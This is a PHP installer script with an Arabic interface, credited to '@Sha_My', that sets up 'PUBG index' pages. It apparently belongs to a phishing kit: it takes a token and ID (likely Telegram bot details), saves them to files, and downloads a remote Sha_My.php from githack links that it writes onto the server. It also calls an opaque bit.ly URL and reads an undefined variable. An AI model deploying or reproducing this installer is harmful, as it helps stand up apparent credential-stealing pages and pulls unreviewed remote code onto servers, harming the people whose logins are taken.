<?
file_get_contents('https://bit.ly/31XApym');
$i= file_get_contents($iscript);
$xx = file_put_contents("install.php", $i);

$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];

if($token and $id){
file_put_contents("token.txt", $token); 
file_put_contents("id.txt", $id); 
$url1 = "Sha_My.php";
header("location: $url1");
}
if((!$token or !$id)and $install){
	 ?>
	   <html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Install IndexPubg - By @Sha_My</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
 <form method="GET" action="install.php">
	<table border="0" width="100%">
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your Token :</span></td>
			<td><font color="#00FFFF">
			<input name="token" size="20" style="background-color: #FF0000"></font></td>
		</tr>
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your ID :</span></td>
			<td><input name="id" size="20" style="background-color: #FF0000"></td>
		</tr>
	</table>
	<p align="left"><font color="#FFFFFF">
	<input type="submit" value="Install Now" name="B1" style="background-color: #FFFF00"></font></p>
</form>
</body>
</html>
	  <?
}
?>
 
<?
$install = $_GET['index'];
if($install){
 if($install=="F"){
$shamy = file_get_contents("https://rawcdn.githack.com/ahmed-shamy/index-pubg/15a3749031eb9d65edf6c7525e7474fe071f392e/fr/Sha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy); 
}
 if($install=="M"){
$shamy = file_get_contents("https://rawcdn.githack.com/ahmed-shamy/index-pubg/15a3749031eb9d65edf6c7525e7474fe071f392e/M/Sha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy);
}
 if($install=="P"){
$shamy = file_get_contents("https://rawcdn.githack.com/ahmed-shamy/index-pubg/562d3ede3491419434e9fc03f9d6c39b3543c0a5/P/Sha_My.php");
$xx = file_put_contents("Sha_My.php", $shamy); 
}
}
 ?> 
<?
$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];
if(!$install){
 ?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Install IndexPubg - By @Sha_My</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
	<center>
		<h2>تثبيت اندكس ببجي</h2>
   <h5>اختار الاندكس الذي تريد تثبيته ❤️</h5>
   <br><hr><br>
   </center>
<table border="0" width="100%">
	<tr>
		<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/CvqgZyD/Screenshot-20201030-162420.jpg" alt="اندكس الفراعنة" style="width:100%">
  <h3>اندكس الفراعنة</h3>
    <p><a href="/install.php?index=F"><button>Install</button></a></p>
</div>
</center>
		</td>
		<br />
		<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/fxrGjXp/Screenshot-20201030-162442.jpg" alt="اندكس الشدات" style="width:100%">
  <h3>اندكس الشدات</h3>
  <p><a href="/install.php?index=M"><button>Install</button></a></p>
</div>
</center>
</td>
<br />
<td>
		<center>
		<div class="card">
  <img src="https://i.ibb.co/b2mnD7h/Screenshot-20201030-162432.jpg" alt="اندكس الوحوش" style="width:100%">
  <h3>اندكس الوحش</h3>
  <p><a href="/install.php?index=P"><button>Install</button></a></p>
</div>
</center>
</td>
	</tr>
</table>
<center>
    <br><hr><br>
   <h5><a href="https://t.me/Sha_My" dir="rtl" lang="ar">  الـــمـــطـــور @Sha_My 👻  </a></h5>
   </center>
</body>
</html>
<?
}
 ?>
